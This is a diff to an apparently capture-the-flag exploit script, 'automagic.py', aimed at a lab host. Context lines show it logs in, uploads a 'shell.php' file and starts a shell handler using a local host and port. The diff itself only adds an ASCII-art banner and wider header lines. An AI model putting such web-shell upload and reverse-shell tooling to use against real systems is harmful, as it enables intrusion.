@@ -9,6 +9,20 @@ import os
 targetip = '10.10.10.185'
 shell = "./shell.php"
 s = requests.session()
+h = "*"
+head = h * 56
+logo = ""
+logo += "*                            ,,/,,, ,,                 *\n"
+logo += "*   ..           .        ,& @@@ ,,,,                  *\n"
+logo += "*                        ,@*  @@,                      *\n"
+logo += "*                      ,@ &&@@/@@               .      *\n"
+logo += "*                     ,@@&@@@@@@(,,.                   *\n"
+logo += "*               ,,@&@@@@@@@@@@@@@@@@@@@@,,             *\n"
+logo += "*                    ,@@@@ @@@& @@@@,                  *\n"
+logo += "*                    ,@@@        &@@,                  *\n"
+logo += "*         ..          ,@&@@@&@@@@@@                    *\n"
+logo += "*                      ,*@ @@@@@@/,                    *\n"
+logo += "*                         ,,@@,,                       *"
 
 def handler(s: requests.session):
     time.sleep(2)
@@ -48,6 +62,7 @@ def login():
         )
     except requests.exceptions.ConnectionError as connecterr:
         print("Cannot Connect to Host")
+        print(head)
         exit()
     if login.status_code == 302:
         return upload()
@@ -85,7 +100,9 @@ def shell():
     t1.start()
 def main():
     h = "*"
-    head = h * 30
+    head = h * 56
+    print(head)
+    print(logo)
     print(head)
     print('automagic')
     print('Usage: python3 ./automagic.py <Local Host> <Local Port>')
